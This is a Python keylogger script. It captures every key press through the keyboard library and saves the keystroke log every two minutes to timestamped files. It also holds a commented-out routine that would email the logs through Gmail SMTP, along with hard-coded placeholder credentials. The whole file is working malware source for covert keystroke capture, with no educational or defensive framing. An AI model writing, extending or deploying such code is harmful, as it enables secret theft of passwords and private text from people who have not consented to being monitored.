import smtplib
from threading import Timer
import os
import keyboard
import datetime

EMAIL_ID = "@gmail.com"
EMAIL_PASSWORD = "hello12344"


class Keylogger:
    def __init__(self, interval, report_method="mail"):
        self.interval = interval
        self.filename = "keyLogReport"
        self.report_method = report_method
        self.log = ''
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = '.'
            else:
                name = name.replace(' ', "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):

        with open(f"keyLog/{self.filename}.txt", 'w') as f:
            print(self.log, file=f)
        # print(f"[+] Saved {self.filename}.txt")

    def update_file_name(self):
        start_dt_time = str(self.start_dt)[11:-10].replace(":", " ")
        end_dt_time = str(self.end_dt)[11:-10].replace(":", " ")
        self.filename = f"{self.filename}_{start_dt_time}_{end_dt_time}"
    #
    # def sendmail(self, email, password, message):
    #     server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    #     server.starttls()
    #     server.login(email, password)
    #     server.sendmail(email, email, message)
    #     server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.datetime.now()
            self.update_file_name()
            self.report_to_file()
            self.start_dt = datetime.datetime.now()
        self.log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_press(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(120, report_method='file')
    keylogger.start()
